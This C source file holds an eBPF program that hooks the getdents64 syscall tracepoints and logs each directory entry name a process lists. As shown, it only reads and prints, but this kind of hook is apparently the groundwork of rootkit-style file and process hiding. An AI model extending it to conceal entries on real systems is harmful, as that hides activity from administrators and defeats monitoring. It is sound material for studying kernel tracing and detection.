#include <stddef.h>

#include <linux/bpf.h>

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define PATHLEN 256

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long u64;

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, u64);
} map_buffs SEC(".maps");

struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

struct linux_dirent64 {
    u64  d_ino;    /* 64-bit inode number */
    u64  d_off;    /* 64-bit offset to next structure */
    u16  d_reclen; /* Size of this dirent */
    u8   d_type;   /* File type */
    char d_name[]; /* Filename (null-terminated) */
};

struct trace_event_raw_sys_enter {
    unsigned long long unused;
    int __syscall_nr;
    unsigned int padding;
    unsigned int fd;
    struct linux_dirent64 *dirent;
    unsigned int count;
};

struct trace_event_raw_sys_exit {
    u16 common_type;
    u8 commong_flags;
    u8 common_preempt_count;
    u32 common_pid;

    u32 __syscall_nr;
    u64 ret;
};

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->dirent;

    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

int __strlen(const char *n) {
    int len = 0;

    while (n[len++] != '\0');

    return len;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {

    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    struct linux_dirent64 *dirp = 0;
    int i = 0;
    u16 d_reclen = 0;

    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    unsigned int bpos = 0;

    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (!pbuff_addr) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;

    char buf[PATHLEN];

    while (bpos < total_bytes_read && i <= 200) {
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&buf, PATHLEN, dirp->d_name);

        bpf_printk("reclen: %d i:%d %s", d_reclen, i, buf);

        bpos += d_reclen;
        i += 1;
    }

    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return ctx->ret;
}

char _license[] SEC("license") = "GPL";
